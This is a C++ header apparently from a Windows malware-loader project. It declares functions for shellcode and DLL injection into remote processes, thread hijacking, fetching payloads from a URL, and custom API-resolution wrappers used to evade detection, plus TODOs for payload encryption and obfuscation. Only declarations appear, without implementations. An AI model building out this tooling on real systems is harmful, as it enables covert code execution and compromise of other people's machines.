#pragma comment(lib, "Bcrypt.lib")

#ifndef FUNCTIONS_H
#define FUNCTIONS_H

#ifdef max
#undef max
#endif


/* --- TODO LIST --- */
// Implement XOR Encryption 
// Implement Securing the Encryption Key of XOR
// Implement Both methods of RC4 encryption
// Implement MacFuscaion with IPv4/IPV6 addresses 
// Implement UUID deobfuscation+ Obfuscation 
// 
/* -------- INCLUDES --------*/

#include <string>
#include <codecvt>
#include <cstdio>
using namespace std;
#define _CRT_SECURE_NO_WARNINGS

/* [-------- Global Variables -------] */
extern char big_string[];
extern char big_numbers[];
/* [-------- FUNCTION MACROS --------] */

/* Macros for rockyPrintColor */
#define rockyColor(baseColor) (FOREGROUND_##baseColor)
#define rockyColorBase(baseColor) (FOREGROUND_##baseColor | FOREGROUND_INTENSITY)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

/* [CUSTOM GetModuleHandle https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-containing_record] */
#define CONTAINING_RECORD(address, type, field) \
    ((type *)((PCHAR)(address) - (ULONG_PTR)(&((type *)0)->field)))

#include "includes.h"
/* Macros for Initialise Object Attributs for rockyCreateThread */
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}
/* [-------- CUSTOM FUNCTIONS --------] */


/* [CUSTOM: rockyGetModuleHandle (GetModuleHandle)]*/
HMODULE rockyGetModuleHandle(IN LPCWSTR szModuleName);
HMODULE rockyGetModuleHandle2(IN LPCWSTR szModuleName);

/* [CUSTOM: rockyGetProcAddress (GetProcAddress)] */
void* rockyGetProcAddress(HMODULE hModule, const char* functionName);

NTSTATUS rockyVirtualProtect2(HANDLE hProcess, PVOID baseAddress, SIZE_T regionSize, ULONG newProtect, PULONG oldProtect);
BOOL rockyInjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode);

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);
/* [CUSTOM: rockyPrintColor (printf())]*/
enum ConsoleColor {
	red = rockyColorBase(RED),
	green = rockyColorBase(GREEN),
	blue = rockyColorBase(BLUE),
	yellow = rockyColor(RED) | rockyColorBase(GREEN),
	purple = rockyColor(RED) | rockyColorBase(BLUE),
	white = rockyColor(RED) | rockyColor(GREEN) | rockyColorBase(BLUE),
	grey = rockyColor(RED) | rockyColor(GREEN) | rockyColor(BLUE),
	default_color = 15
};
void rockyPrintColor(ConsoleColor color, const char* format, ...);


	/* [CUSTOM: rockyAlloc (Alloc)] */
NTSTATUS rockyAlloc(const void* data, size_t size, void** outAddress);
NTSTATUS rockyAlloc(const char* stringData, void** outAddress);

/* [CUSTOM: rockyLoadLibrary (LoadLibrary)] */
void* rockyLoadLibrary(const wchar_t* dllName);

/* [CUSTOM: rockyDealloc (Dealloc)] */
NTSTATUS rockyDealloc(void* pAddress);

NTSTATUS rockyNtClose(HANDLE handle);
/* [CUSTOM: rockyPrintAllocated (Show Payload)]*/
void rockyPrintAllocated(const void* pAddress, size_t size);


/* [CUSTOM convert strings to Wstring] */
std::wstring stringToWstring(const string& str);

/* [CUSTOM: rockyVirtualProtect function] */
NTSTATUS rockyVirtualProtect(HANDLE hProcess, PVOID baseAddress, SIZE_T regionSize, ULONG newProtect, PULONG oldProtect);
/* [CUSTOM: rockyCreateThread function] */
NTSTATUS rockyCreateThreadEx(_Out_ PHANDLE ThreadHandle,_In_ ACCESS_MASK DesiredAccess,_In_opt_ POBJECT_ATTRIBUTES64 ObjectAttributes,_In_ HANDLE ProcessHandle,_In_ LPTHREAD_START_ROUTINE StartRoutine,_In_opt_ PVOID Argument,_In_ ULONG CreateFlags,_In_ SIZE_T ZeroBits,_In_ SIZE_T StackSize,_In_ SIZE_T MaximumStackSize,_In_opt_ PPS_ATTRIBUTE_LIST AttributeList);

LPVOID rockyVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

BOOL rockyWriteToProcessMemory(HANDLE hProcess, PVOID address, PVOID data, SIZE_T size, SIZE_T* bytesWritten);
BOOL rockyInjectDLL(HANDLE hProcess, LPWSTR DllName);


BOOL rockyGetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess);
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize);
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size);

void ensureMultipleOfSix(unsigned char*& data, size_t& size);

BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize);


BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess);

BOOL PrintProcesses();

BOOL GetRemoteProcessHandleUsingNtQuerySystem(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess);




VOID DummyFunction();

BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize);


BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress); 

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress);

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread);


BOOL InjectShellcodeToLocalProcess(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress);

BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread);


BOOL HijackThreadAlt(IN HANDLE hThread, IN PVOID pAddress);


void HijackProcess();


#endif // FUNCTIONS_H
